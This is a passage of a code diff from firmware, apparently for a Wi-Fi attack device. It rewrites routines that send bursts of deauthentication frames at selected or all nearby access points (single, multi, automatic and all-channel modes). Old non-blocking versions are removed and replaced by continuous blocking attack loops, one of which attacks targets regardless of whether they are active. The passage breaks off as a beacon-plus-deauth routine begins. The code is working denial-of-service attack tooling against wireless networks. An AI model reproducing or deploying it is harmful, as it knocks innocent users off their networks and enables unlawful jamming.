-    g_deauthState.currentBssidIndexInBucket = 0;
-    
-    // 根据目标数量动态调整参数
-    int targetCount = SelectedVector.size();
-    if (targetCount > 5) {
-      g_deauthState.packetsPerCycle = perdeauth * 2; // 多目标时增加批次
-    } else {
-      g_deauthState.packetsPerCycle = perdeauth * 3; // 少量目标时更密集
-    }
-  }
-  
-  Serial.println("=== 启动单一攻击（非阻塞） ===");
-  Serial.println("增强模式: " + String(g_enhancedDeauthMode ? "启用" : "禁用"));
-  showAttackStatusPage("单一攻击中");
-  startAttackLED();
-}
-
-// 处理单一攻击
-void processSingleAttack() {
-  unsigned long now = millis();
-  
-  // LED闪烁（非阻塞）
-  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
-    g_deauthState.ledState = !g_deauthState.ledState;
-    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
-    g_deauthState.lastLEDToggleMs = now;
-  }
-  
-  // 按钮检测（降低频率）
-  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
-    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
-      if (showConfirmModal("确认停止攻击")) {
-        stopAttack();
-        return;
-      }
-      startAttackLED();
-      showAttackStatusPage("单一攻击中");
-    }
-    g_deauthState.lastButtonCheckMs = now;
-  }
-  
-  // UI更新（降低频率）
-  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
-    showAttackStatusPage("单一攻击中");
-    g_deauthState.lastUIUpdateMs = now;
-  }
-  
-  // 发送攻击包（每次处理固定数量）
-  if (SelectedVector.empty()) {
-    // 单目标
-    setChannelOptimized(scan_results[scrollindex].channel);
-    if (g_enhancedDeauthMode) {
-      sendDeauthBatchEnhanced(scan_results[scrollindex].bssid, 
-                              g_deauthState.packetsPerCycle, 
-                              g_deauthState.packetCount);
-    } else {
-      sendDeauthBatch(scan_results[scrollindex].bssid, 
-                      g_deauthState.packetsPerCycle, 
-                      g_deauthState.packetCount);
-    }
-  } else {
-    // 多目标：按信道分组批量发送（使用增强版）
-    processChannelBucketsEnhanced();
-  }
-  
-  // LED反馈
-  if (g_deauthState.packetCount >= 1000) {
-    digitalWrite(LED_R, HIGH);
-    delay(5); // 减少LED反馈延时，提高攻击效率
-    digitalWrite(LED_R, LOW);
-    g_deauthState.packetCount = 0;
   }
 }
 
-// 兼容包装器：保持原函数签名
-void Single() {
-  startSingleAttack();
-  // 等待攻击完成或用户停止
-  while (g_deauthState.running) {
-    processSingleAttack();
-  }
-}
-
-// 启动多重攻击
-void startMultiAttack() {
-  g_deauthState.mode = ATTACK_MULTI;
-  g_deauthState.running = true;
-  g_deauthState.currentTargetIndex = 0;
-  g_deauthState.packetCount = 0;
-  g_deauthState.lastPacketMs = 0;
-  g_deauthState.lastUIUpdateMs = 0;
-  g_deauthState.lastButtonCheckMs = 0;
-  g_deauthState.lastLEDToggleMs = 0;
-  g_deauthState.ledState = false;
-  g_deauthState.packetsPerCycle = perdeauth;
-  g_deauthState.uiUpdateInterval = 500;
-  g_deauthState.buttonCheckInterval = 100;
-  g_deauthState.ledBlinkInterval = 500;
-  g_deauthState.channelSet = false;
-  g_deauthState.lastChannel = -1;
-  
-  // 预处理目标列表
-  if (!SelectedVector.empty()) {
-    channelBucketsCache.clearBuckets();
-    for (int idx : SelectedVector) {
-      if (idx >= 0 && idx < (int)scan_results.size()) {
-        channelBucketsCache.add(scan_results[idx].channel, scan_results[idx].bssid);
-      }
-    }
-    g_deauthState.currentChannelBucketIndex = 0;
-    g_deauthState.currentBssidIndexInBucket = 0;
-    
-    // 根据目标数量动态调整参数
-    int targetCount = SelectedVector.size();
-    if (targetCount > 5) {
-      g_deauthState.packetsPerCycle = perdeauth * 2; // 多目标时增加批次
-    } else {
-      g_deauthState.packetsPerCycle = perdeauth * 3; // 少量目标时更密集
-    }
-  }
-  
-  Serial.println("=== 启动多重攻击（非阻塞） ===");
-  Serial.println("增强模式: " + String(g_enhancedDeauthMode ? "启用" : "禁用"));
-  showAttackStatusPage("多重攻击中");
-  startAttackLED();
-}
-
-// 处理多重攻击
-void processMultiAttack() {
-  unsigned long now = millis();
-  
-  // LED闪烁（非阻塞）
-  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
-    g_deauthState.ledState = !g_deauthState.ledState;
-    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
-    g_deauthState.lastLEDToggleMs = now;
-  }
-  
-  // 按钮检测（降低频率）
-  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
-    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
-      if (showConfirmModal("确认停止攻击")) {
-        stopAttack();
-        return;
-      }
-      startAttackLED();
-      showAttackStatusPage("多重攻击中");
-    }
-    g_deauthState.lastButtonCheckMs = now;
-  }
-  
-  // UI更新（降低频率）
-  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
-    showAttackStatusPage("多重攻击中");
-    g_deauthState.lastUIUpdateMs = now;
-  }
-  
-  // 检查是否有目标
-  if (SelectedVector.empty()) {
-    return; // 没有目标，跳过攻击
-  }
-  
-  // 使用增强版信道桶处理多目标
-  processChannelBucketsEnhanced();
-  
-  // LED反馈
-  if (g_deauthState.packetCount >= 200) {
-    digitalWrite(LED_R, HIGH);
-    delay(5); // 减少LED反馈延时，提高攻击效率
-    digitalWrite(LED_R, LOW);
-    g_deauthState.packetCount = 0;
-  }
-}
-
-// 兼容包装器：保持原函数签名
 void Multi() {
-  startMultiAttack();
-  // 等待攻击完成或用户停止
-  while (g_deauthState.running) {
-    processMultiAttack();
+  Serial.println("=== 启动多重攻击 ===");
+  Serial.println("攻击模式: 多重攻击");
+  Serial.println("攻击强度: " + String(perdeauth));
+  
+  showAttackStatusPage("多重攻击中");
+  
+  // LED控制：红灯闪烁
+  startAttackLED();
+  
+  int packetCount = 0;
+  while (true) {
+
+    // 更新攻击状态显示
+    showAttackStatusPage("多重攻击中");
+
+    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
+      digitalWrite(LED_R, LOW);
+      digitalWrite(LED_G, LOW);
+      digitalWrite(LED_B, LOW);
+      delay(200);
+      // 显示确认弹窗
+      if (showConfirmModal("确认停止攻击")) {
+        return; // 确认停止攻击
+      }
+      // 取消则继续攻击，重新启动LED
+      startAttackLED();
+    }
+    if (SelectedVector.empty()) {
+      // 如果没有目标，稍作等待避免空转
+      delay(50);
+      continue;
+    }
+    // 按信道分组，减少频繁切换信道
+    channelBucketsCache.clearBuckets();
+    for (int selectedIndex : SelectedVector) {
+      if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
+        channelBucketsCache.add(scan_results[selectedIndex].channel,
+                                scan_results[selectedIndex].bssid);
+      }
+    }
+    const unsigned int interFrameDelayUs = 250; // 微秒级细微延时
+    for (size_t chIdx = 0; chIdx < channelBucketsCache.buckets.size(); chIdx++) {
+      if (channelBucketsCache.buckets[chIdx].empty()) continue;
+      wext_set_channel(WLAN0_NAME, allChannels[chIdx]);
+      for (const uint8_t *bssidPtr : channelBucketsCache.buckets[chIdx]) {
+        if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
+          digitalWrite(LED_R, LOW);
+          digitalWrite(LED_G, LOW);
+          digitalWrite(LED_B, LOW);
+          delay(200);
+          // 显示确认弹窗
+          if (showConfirmModal("确认停止攻击")) {
+            return; // 确认停止攻击
+          }
+          // 取消则继续攻击，重新启动LED
+          startAttackLED();
+        }
+        // 使用微秒级 burst（标准原因序列），减少调用开销并提升效率
+        sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);
+        if (packetCount >= 200) {
+          digitalWrite(LED_R, HIGH);
+          delay(30);
+          digitalWrite(LED_R, LOW);
+          packetCount = 0;
+        }
+      }
+    }
+    // 处理未在 allChannels 中的信道
+    for (const auto &eb : channelBucketsCache.extras) {
+      if (eb.bssids.empty()) continue;
+      wext_set_channel(WLAN0_NAME, eb.channel);
+      for (const uint8_t *bssidPtr : eb.bssids) {
+        if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
+          digitalWrite(LED_R, LOW);
+          digitalWrite(LED_G, LOW);
+          digitalWrite(LED_B, LOW);
+          delay(200);
+          // 显示确认弹窗
+          if (showConfirmModal("确认停止攻击")) {
+            return; // 确认停止攻击
+          }
+          // 取消则继续攻击，重新启动LED
+          startAttackLED();
+        }
+        sendDeauthBurstToBssidUs(bssidPtr, perdeauth, packetCount, interFrameDelayUs);
+        if (packetCount >= 200) {
+          digitalWrite(LED_R, HIGH);
+          delay(30);
+          digitalWrite(LED_R, LOW);
+          packetCount = 0;
+        }
+      }
+    }
+    delay(10);
   }
 }
 void updateSmartTargets() {
@@ -4277,144 +4631,29 @@ void updateSmartTargets() {
   } else {  // 扫描失败
     // 恢复之前的扫描结果
     scan_results = std::move(backup_results);
-    // 恢复所有目标的活跃状态
-    for (auto& target : smartTargets) {
-      target.active = true;
-    }
     Serial.println("Scan failed, restored previous results");
   }
 }
-// 启动自动单一攻击
-void startAutoSingleAttack() {
-  g_deauthState.mode = ATTACK_AUTO_SINGLE;
-  g_deauthState.running = true;
-  g_deauthState.currentTargetIndex = 0;
-  g_deauthState.packetCount = 0;
-  g_deauthState.lastPacketMs = 0;
-  g_deauthState.lastUIUpdateMs = 0;
-  g_deauthState.lastButtonCheckMs = 0;
-  g_deauthState.lastLEDToggleMs = 0;
-  g_deauthState.lastScanMs = 0;
-  g_deauthState.ledState = false;
-  g_deauthState.packetsPerCycle = 3; // 自动攻击使用较小批次
-  g_deauthState.uiUpdateInterval = 500;
-  g_deauthState.buttonCheckInterval = 120;
-  g_deauthState.ledBlinkInterval = 600;
-  g_deauthState.channelSet = false;
-  g_deauthState.lastChannel = -1;
-  
-  // 初始化目标列表
-  if (smartTargets.empty() && !SelectedVector.empty()) {
-    for (int selectedIndex : SelectedVector) {
-      if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
-        TargetInfo target;
-        memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
-        target.channel = scan_results[selectedIndex].channel;
-        target.active = true;
-        smartTargets.push_back(target);
-      }
-    }
-    g_deauthState.lastScanMs = millis();
-  }
-  
-  Serial.println("=== 启动自动单一攻击（非阻塞） ===");
-  showAttackStatusPage("自动单一攻击中");
-  startAttackLED();
-}
-
-// 处理自动单一攻击
-void processAutoSingleAttack() {
-  unsigned long now = millis();
-  
-  // LED闪烁（非阻塞）
-  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
-    g_deauthState.ledState = !g_deauthState.ledState;
-    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
-    g_deauthState.lastLEDToggleMs = now;
-  }
-  
-  // 按钮检测（降低频率）
-  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
-    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
-      if (showConfirmModal("确认停止攻击")) {
-        stopAttack();
-        return;
-      }
-      startAttackLED();
-      showAttackStatusPage("自动单一攻击中");
-    }
-    g_deauthState.lastButtonCheckMs = now;
-  }
-  
-  // UI更新（降低频率）
-  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
-    showAttackStatusPage("自动单一攻击中");
-    g_deauthState.lastUIUpdateMs = now;
-  }
-  
-  // 定期扫描更新（每10分钟）
-  if (now - g_deauthState.lastScanMs >= SCAN_INTERVAL) {
-    std::vector<WiFiScanResult> backup = scan_results; // 备份当前结果
-    updateSmartTargets();
-    if (scan_results.empty()) {
-      scan_results = std::move(backup); // 如果扫描失败，恢复备份
-    }
-    g_deauthState.lastScanMs = now;
-  }
-  
-  // 攻击目标
-  if (smartTargets.empty()) {
-    return; // 没有目标，跳过攻击
-  }
-  
-  for (const auto& target : smartTargets) {
-    if (target.active) {  // 只攻击活跃目标
-      setChannelOptimized(target.channel);
-      sendDeauthBatch(target.bssid, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
-      
-      // LED反馈
-      if (g_deauthState.packetCount >= 500) {
-        digitalWrite(LED_R, HIGH);
-        delay(5); // 减少LED反馈延时，提高攻击效率
-        digitalWrite(LED_R, LOW);
-        g_deauthState.packetCount = 0;
-      }
-      break; // 每次只处理一个目标
-    }
-  }
-}
-
-// 兼容包装器：保持原函数签名
 void AutoSingle() {
-  startAutoSingleAttack();
-  // 等待攻击完成或用户停止
-  while (g_deauthState.running) {
-    processAutoSingleAttack();
-  }
-}
-// 启动自动多重攻击
-void startAutoMultiAttack() {
-  g_deauthState.mode = ATTACK_AUTO_MULTI;
-  g_deauthState.running = true;
-  g_deauthState.currentTargetIndex = 0;
-  g_deauthState.packetCount = 0;
-  g_deauthState.lastPacketMs = 0;
-  g_deauthState.lastUIUpdateMs = 0;
-  g_deauthState.lastButtonCheckMs = 0;
-  g_deauthState.lastLEDToggleMs = 0;
-  g_deauthState.lastScanMs = 0;
-  g_deauthState.ledState = false;
-  g_deauthState.packetsPerCycle = 5; // 自动多重攻击使用中等批次
-  g_deauthState.uiUpdateInterval = 500;
-  g_deauthState.buttonCheckInterval = 120;
-  g_deauthState.ledBlinkInterval = 600;
-  g_deauthState.channelSet = false;
-  g_deauthState.lastChannel = -1;
+  Serial.println("=== 启动自动单一攻击 ===");
+  Serial.println("攻击模式: 自动单一攻击");
+  Serial.println("攻击强度: " + String(perdeauth));
+  
+  showAttackStatusPage("自动单一攻击中");
+  
+  // LED控制：红灯闪烁
+  startAttackLED();
+
+  unsigned long prevBlink = 0;
+  bool redState = true;
+  const int blinkInterval = 600;
+  unsigned long buttonCheckTime = 0;
+  const int buttonCheckInterval = 120; // 检查按钮的间隔
   
   // 初始化目标列表
   if (smartTargets.empty() && !SelectedVector.empty()) {
     for (int selectedIndex : SelectedVector) {
-      if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
+      if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
         TargetInfo target;
         memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
         target.channel = scan_results[selectedIndex].channel;
@@ -4422,241 +4661,369 @@ void startAutoMultiAttack() {
         smartTargets.push_back(target);
       }
     }
-    g_deauthState.lastScanMs = millis();
+    lastScanTime = millis();
   }
-  
-  Serial.println("=== 启动自动多重攻击（非阻塞） ===");
-  showAttackStatusPage("自动多重攻击中");
-  startAttackLED();
-}
 
-// 处理自动多重攻击
-void processAutoMultiAttack() {
-  unsigned long now = millis();
-  
-  // LED闪烁（非阻塞）
-  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
-    g_deauthState.ledState = !g_deauthState.ledState;
-    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
-    g_deauthState.lastLEDToggleMs = now;
-  }
-  
-  // 按钮检测（降低频率）
-  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
-    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
-      if (showConfirmModal("确认停止攻击")) {
-        stopAttack();
-        return;
+  while (true) {
+    // 更新攻击状态显示
+    showAttackStatusPage("自动单一攻击中");
+
+    unsigned long currentTime = millis();
+    
+    // LED闪烁控制
+    if (currentTime - prevBlink >= blinkInterval) {
+      redState = !redState;
+      digitalWrite(LED_R, redState ? HIGH : LOW);
+      prevBlink = currentTime;
+    }
+
+    // 按钮检查（增加检查间隔以减少CPU负载）
+    if (currentTime - buttonCheckTime >= buttonCheckInterval) {
+      if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
+        digitalWrite(LED_R, LOW);
+        digitalWrite(LED_G, LOW);
+        digitalWrite(LED_B, LOW);
+        delay(200);
+        // 显示确认弹窗
+        if (showConfirmModal("确认停止攻击")) {
+          return; // 确认停止攻击
+        }
+        // 取消则继续攻击，重新启动LED
+        startAttackLED();
       }
+      buttonCheckTime = currentTime;
+    }
+
+    // 定期扫描更新（每10分钟）
+    if (currentTime - lastScanTime >= SCAN_INTERVAL) {
+      std::vector<WiFiScanResult> backup = scan_results; // 备份当前结果
+      updateSmartTargets();
+      if (scan_results.empty()) {
+        scan_results = std::move(backup); // 如果扫描失败，恢复备份
+      }
+      lastScanTime = currentTime;
+    }
+
+    int packetCount = 0;
+
+if (smartTargets.empty()) {
+  // 如果没有目标，等待一段时间再继续
+  delay(100);
+  continue;
+}
+     // 攻击目标
+    for (const auto& target : smartTargets) {
+  // 不管是否活跃都进行攻击
+  wext_set_channel(WLAN0_NAME, target.channel);
+  
+  // 使用 burst 版本减少逐帧调用开销
+  sendDeauthBurstToBssid(target.bssid, 3, packetCount, 5);
+          if (packetCount >= 500) {
+          digitalWrite(LED_R, HIGH);
+          delay(50);
+          digitalWrite(LED_R, LOW);
+          packetCount = 0;
+        }
+    
+    // 检查按钮状态
+    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
+      digitalWrite(LED_R, LOW);
+      digitalWrite(LED_G, LOW);
+      digitalWrite(LED_B, LOW);
+      delay(200);
+      // 显示确认弹窗
+      if (showConfirmModal("确认停止攻击")) {
+        return; // 确认停止攻击
+      }
+      // 取消则继续攻击，重新启动LED
       startAttackLED();
-      showAttackStatusPage("自动多重攻击中");
     }
-    g_deauthState.lastButtonCheckMs = now;
   }
+    delay(10);
+  }
+}
+void AutoMulti() {
+  Serial.println("=== 启动自动多重攻击 ===");
+  Serial.println("攻击模式: 自动多重攻击");
+  Serial.println("攻击强度: " + String(perdeauth));
   
-  // UI更新（降低频率）
-  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
+  showAttackStatusPage("自动多重攻击中");
+  
+  // LED控制：红灯闪烁
+  startAttackLED();
+  unsigned long prevBlink = 0;
+  bool redState = true;
+  const int blinkInterval = 600;
+  unsigned long buttonCheckTime = 0;
+  const int buttonCheckInterval = 120;
+  static size_t currentTargetIndex = 0;
+  if (smartTargets.empty() && !SelectedVector.empty()) {
+    for (int selectedIndex : SelectedVector) {
+      if (selectedIndex >= 0 && (size_t)selectedIndex < scan_results.size()) {
+        TargetInfo target;
+        memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
+        target.channel = scan_results[selectedIndex].channel;
+        target.active = true;
+        smartTargets.push_back(target);
+      }
+    }
+    lastScanTime = millis();
+  }
+  while (true) {
+    // 更新攻击状态显示
     showAttackStatusPage("自动多重攻击中");
-    g_deauthState.lastUIUpdateMs = now;
-  }
-  
-  // 定期扫描更新（每10分钟）
-  if (now - g_deauthState.lastScanMs >= SCAN_INTERVAL) {
-    std::vector<WiFiScanResult> backup = scan_results;
-    updateSmartTargets();
-    if (scan_results.empty()) {
-      scan_results = std::move(backup);
+
+    unsigned long currentTime = millis();
+    if (currentTime - prevBlink >= blinkInterval) {
+      redState = !redState;
+      digitalWrite(LED_R, redState ? HIGH : LOW);
+      prevBlink = currentTime;
     }
-    g_deauthState.lastScanMs = now;
-  }
-  
-  // 攻击目标（轮询方式）
-  if (!smartTargets.empty()) {
-    // 跳过非活跃目标
-    while (g_deauthState.currentTargetIndex < smartTargets.size() && !smartTargets[g_deauthState.currentTargetIndex].active) {
-      g_deauthState.currentTargetIndex++;
+    if (currentTime - buttonCheckTime >= buttonCheckInterval) {
+      if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
+        digitalWrite(LED_R, LOW);
+        digitalWrite(LED_G, LOW);
+        digitalWrite(LED_B, LOW);
+        delay(200);
+        // 显示确认弹窗
+        if (showConfirmModal("确认停止攻击")) {
+          return; // 确认停止攻击
+        }
+        // 取消则继续攻击，重新启动LED
+        startAttackLED();
+      }
+      buttonCheckTime = currentTime;
     }
-    if (g_deauthState.currentTargetIndex >= smartTargets.size()) {
-      g_deauthState.currentTargetIndex = 0;
-      // 再次跳过非活跃目标
-      while (g_deauthState.currentTargetIndex < smartTargets.size() && !smartTargets[g_deauthState.currentTargetIndex].active) {
-        g_deauthState.currentTargetIndex++;
+    if (currentTime - lastScanTime >= SCAN_INTERVAL) {
+      std::vector<WiFiScanResult> backup = scan_results;
+      updateSmartTargets();
+      if (scan_results.empty()) {
+        scan_results = std::move(backup);
+      }
+      lastScanTime = currentTime;
+    }
+    int packetCount = 0;
+    if (!smartTargets.empty()) {
+      if (currentTargetIndex >= smartTargets.size()) {
+        currentTargetIndex = 0;
+      }
+      const auto& target = smartTargets[currentTargetIndex];
+      wext_set_channel(WLAN0_NAME, target.channel);
+      sendFixedReasonDeauthBurst(target.bssid, 0, 5, packetCount, 5);
+      if (packetCount >= 100) { // 提高LED刷新阈值，减少IO
+        digitalWrite(LED_R, HIGH);
+        delay(50);
+        digitalWrite(LED_R, LOW);
+        packetCount = 0;
+      }
+      currentTargetIndex = (currentTargetIndex + 1) % smartTargets.size();
+    }
+    // 优化：减少无效延时
+    // delay(10); // 可根据实际情况调整或去除
+  }
+}
+void All() {
+  Serial.println("=== 启动全频道攻击 ===");
+  Serial.println("攻击模式: 全频道攻击");
+  Serial.println("攻击强度: " + String(perdeauth));
+  
+  showAttackStatusPage("全频道攻击中");
+  
+  // LED控制：红灯闪烁
+  startAttackLED();
+  
+  while (true) {
+    // 更新攻击状态显示
+    showAttackStatusPage("全频道攻击中");
+    
+    if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
+      digitalWrite(LED_R, LOW);
+      digitalWrite(LED_G, LOW);
+      digitalWrite(LED_B, LOW);
+      delay(200);
+      // 显示确认弹窗
+      if (showConfirmModal("确认停止攻击")) {
+        return; // 确认停止攻击
+      }
+      // 取消则继续攻击，重新启动LED
+      startAttackLED();
+    }
+    
+    // 为所有网络创建目标（如果还没有创建）
+    if (smartTargets.empty()) {
+      for (size_t i = 0; i < scan_results.size(); i++) {
+        TargetInfo target;
+        memcpy(target.bssid, scan_results[i].bssid, 6);
+        target.channel = scan_results[i].channel;
+        target.active = true;
+        smartTargets.push_back(target);
       }
     }
     
-    if (g_deauthState.currentTargetIndex < smartTargets.size()) {
-      const auto& target = smartTargets[g_deauthState.currentTargetIndex];
-      setChannelOptimized(target.channel);
-      sendDeauthBatch(target.bssid, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
-      
-      // LED反馈
-      if (g_deauthState.packetCount >= 100) {
-        digitalWrite(LED_R, HIGH);
-        delay(5); // 减少LED反馈延时，提高攻击效率
-        digitalWrite(LED_R, LOW);
-        g_deauthState.packetCount = 0;
-      }
-      g_deauthState.currentTargetIndex = (g_deauthState.currentTargetIndex + 1) % smartTargets.size();
-    }
-  }
-}
-
-// 启动全频道攻击
-void startAllAttack() {
-  g_deauthState.mode = ATTACK_ALL;
-  g_deauthState.running = true;
-  g_deauthState.currentTargetIndex = 0;
-  g_deauthState.packetCount = 0;
-  g_deauthState.lastPacketMs = 0;
-  g_deauthState.lastUIUpdateMs = 0;
-  g_deauthState.lastButtonCheckMs = 0;
-  g_deauthState.lastLEDToggleMs = 0;
-  g_deauthState.ledState = false;
-  g_deauthState.packetsPerCycle = perdeauth;
-  g_deauthState.uiUpdateInterval = 500;
-  g_deauthState.buttonCheckInterval = 100;
-  g_deauthState.ledBlinkInterval = 500;
-  g_deauthState.channelSet = false;
-  g_deauthState.lastChannel = -1;
-  
-  // 为所有网络创建目标（如果还没有创建）
-  if (smartTargets.empty()) {
-    for (size_t i = 0; i < scan_results.size(); i++) {
-      TargetInfo target;
-      memcpy(target.bssid, scan_results[i].bssid, 6);
-      target.channel = scan_results[i].channel;
-      target.active = true;
-      smartTargets.push_back(target);
-    }
-  }
-  
-  // 预处理目标列表
-  channelBucketsCache.clearBuckets();
-  for (const auto &t : smartTargets) {
-    if (t.active) {
+    // 按信道分组，减少频繁切换信道
+    channelBucketsCache.clearBuckets();
+    for (const auto &t : smartTargets) {
       channelBucketsCache.add(t.channel, t.bssid);
     }
-  }
-  g_deauthState.currentChannelBucketIndex = 0;
-  g_deauthState.currentBssidIndexInBucket = 0;
-  
-  // 根据目标数量动态调整参数
-  int targetCount = smartTargets.size();
-  if (targetCount > 10) {
-    g_deauthState.packetsPerCycle = perdeauth * 2; // 大量目标时增加批次
-  } else {
-    g_deauthState.packetsPerCycle = perdeauth * 3; // 少量目标时更密集
-  }
-  
-  Serial.println("=== 启动全频道攻击（非阻塞） ===");
-  Serial.println("增强模式: " + String(g_enhancedDeauthMode ? "启用" : "禁用"));
-  showAttackStatusPage("全频道攻击中");
-  startAttackLED();
-}
-
-// 处理全频道攻击
-void processAllAttack() {
-  unsigned long now = millis();
-  
-  // LED闪烁（非阻塞）
-  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
-    g_deauthState.ledState = !g_deauthState.ledState;
-    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
-    g_deauthState.lastLEDToggleMs = now;
-  }
-  
-  // 按钮检测（降低频率）
-  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
-    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
-      if (showConfirmModal("确认停止攻击")) {
-        stopAttack();
-        return;
+    
+    int packetCount = 0;
+    for (size_t chIdx = 0; chIdx < channelBucketsCache.buckets.size(); chIdx++) {
+      if (channelBucketsCache.buckets[chIdx].empty()) continue;
+      wext_set_channel(WLAN0_NAME, allChannels[chIdx]);
+      for (const uint8_t *bssidPtr : channelBucketsCache.buckets[chIdx]) {
+        if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
+          digitalWrite(LED_R, LOW);
+          digitalWrite(LED_G, LOW);
+          digitalWrite(LED_B, LOW);
+          delay(200);
+          // 显示确认弹窗
+          if (showConfirmModal("确认停止攻击")) {
+            return; // 确认停止攻击
+          }
+          // 取消则继续攻击，重新启动LED
+          startAttackLED();
+        }
+        sendDeauthBurstToBssid(bssidPtr, perdeauth, packetCount, 0);
+        if (packetCount >= 100) { // 提高LED刷新阈值，减少IO
+          digitalWrite(LED_R, HIGH);
+          delay(50);
+          digitalWrite(LED_R, LOW);
+          packetCount = 0;
+        }
       }
-      startAttackLED();
-      showAttackStatusPage("全频道攻击中");
     }
-    g_deauthState.lastButtonCheckMs = now;
-  }
-  
-  // UI更新（降低频率）
-  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
-    showAttackStatusPage("全频道攻击中");
-    g_deauthState.lastUIUpdateMs = now;
-  }
-  
-  // 使用增强版信道桶处理所有目标
-  processChannelBucketsEnhanced();
-  
-  // LED反馈
-  if (g_deauthState.packetCount >= 100) {
-    digitalWrite(LED_R, HIGH);
-    delay(5); // 减少LED反馈延时，提高攻击效率
-    digitalWrite(LED_R, LOW);
-    g_deauthState.packetCount = 0;
-  }
-}
-
-// 启动信标+解除认证攻击
-void startBeaconDeauthAttack() {
-  g_deauthState.mode = ATTACK_BEACON_DEAUTH;
-  g_deauthState.running = true;
-  g_deauthState.currentTargetIndex = 0;
-  g_deauthState.packetCount = 0;
-  g_deauthState.lastPacketMs = 0;
-  g_deauthState.lastUIUpdateMs = 0;
-  g_deauthState.lastButtonCheckMs = 0;
-  g_deauthState.lastLEDToggleMs = 0;
-  g_deauthState.ledState = false;
-  g_deauthState.packetsPerCycle = 1; // 信标攻击使用小批次
-  g_deauthState.uiUpdateInterval = 500;
-  g_deauthState.buttonCheckInterval = 100;
-  g_deauthState.ledBlinkInterval = 800;
-  g_deauthState.channelSet = false;
-  g_deauthState.lastChannel = -1;
-  
-  Serial.println("=== 启动信标+解除认证攻击（非阻塞） ===");
-  showAttackStatusPage("信标+解除认证攻击中");
-  startAttackLED();
-}
-
-// 处理信标+解除认证攻击
-void processBeaconDeauthAttack() {
-  unsigned long now = millis();
-  
-  // LED闪烁（非阻塞）
-  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
-    g_deauthState.ledState = !g_deauthState.ledState;
-    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
-    g_deauthState.lastLEDToggleMs = now;
-  }
-  
-  // 按钮检测（降低频率）
-  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
-    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
-      if (showConfirmModal("确认停止攻击")) {
-        stopAttack();
-        return;
+    // extras信道处理
+    for (const auto &eb : channelBucketsCache.extras) {
+      if (eb.bssids.empty()) continue;
+      wext_set_channel(WLAN0_NAME, eb.channel);
+      for (const uint8_t *bssidPtr : eb.bssids) {
+        if ((digitalRead(BTN_OK) == LOW) || (digitalRead(BTN_BACK) == LOW)){
+          digitalWrite(LED_R, LOW);
+          digitalWrite(LED_G, LOW);
+          digitalWrite(LED_B, LOW);
+          delay(200);
+          // 显示确认弹窗
+          if (showConfirmModal("确认停止攻击")) {
+            return; // 确认停止攻击
+          }
+          // 取消则继续攻击，重新启动LED
+          startAttackLED();
+        }
+        sendDeauthBurstToBssid(bssidPtr, perdeauth, packetCount, 0);
+        if (packetCount >= 100) { // 提高LED刷新阈值，减少IO
+          digitalWrite(LED_R, HIGH);
+          delay(50);
+          digitalWrite(LED_R, LOW);
+          packetCount = 0;
+        }
       }
-      startAttackLED();
-      showAttackStatusPage("信标+解除认证攻击中");
     }
-    g_deauthState.lastButtonCheckMs = now;
+    
+    delay(10); // 短暂延时避免CPU过载
   }
+}
+
+
+void BeaconDeauth() {
+  Serial.println("=== 启动信标+解除认证攻击 ===");
+  Serial.println("攻击模式: 信标+解除认证攻击");
